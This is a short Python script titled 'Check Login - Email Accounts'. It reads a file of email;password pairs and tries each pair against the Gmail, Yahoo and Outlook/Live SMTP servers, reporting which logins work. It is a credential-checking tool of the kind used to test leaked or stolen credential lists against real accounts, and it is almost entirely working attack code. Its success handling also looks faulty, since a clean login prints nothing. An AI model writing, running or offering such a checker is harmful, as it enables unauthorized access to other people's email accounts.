#!/usr/bin/python
# Check Login - Email Accounts
# By Sql3t0
#
# style from lines in file to read
# e.g:
# 	  filename.txt
#		email1@gmail.com;passwd1
#		email1@yahoo.com;passwd2
#		continue...
#
# Usage: python scriptname.py filename.txt


import sys
import smtplib
smtp_servers = ['smtp.gmail.com:587','smtp.mail.yahoo.com:587','smtp.live.com:587']

def login(s,mail,passwd):
	s.starttls()
	#s.set_debuglevel(1) 
	try:
		s.login(mail,passwd)
	except smtplib.SMTPAuthenticationError as e:
		if e[0] == 534:
			sys.stdout.write('\r[+] Login: %s ; Passwd: %s  [OK] ! 											\n'%(mail,passwd))
		elif e[0] == 535:
			sys.stdout.write('\r[-] Erro : Mail[%s] and Password[%s] not accepted !'%(mail,passwd))
		else:
			sys.stdout.write('\r[-]Undetermined Error ! 											')

	s.quit()

for l in open(sys.argv[1]):
	dataLogin = l.replace('\n','').split(';')  
	mail   = dataLogin[0] 
	passwd = dataLogin[1]
	if ("@gmail." in mail):
		s = smtplib.SMTP(smtp_servers[0])
		login(s,mail,passwd)
	elif ("@yahoo." in mail):
		s = smtplib.SMTP(smtp_servers[1])
		login(s,mail,passwd)
	elif ("@hotmail." in mail) or ("@live." in mail) or ("@outlook." in mail):
		s = smtplib.SMTP(smtp_servers[2])	
		login(s,mail,passwd)
	else:
		sys.stdout.write('\rUnlisted mail server [%s] ! 											'%mail)
		pass
	
sys.stdout.write('\n[_] End Of Process !')
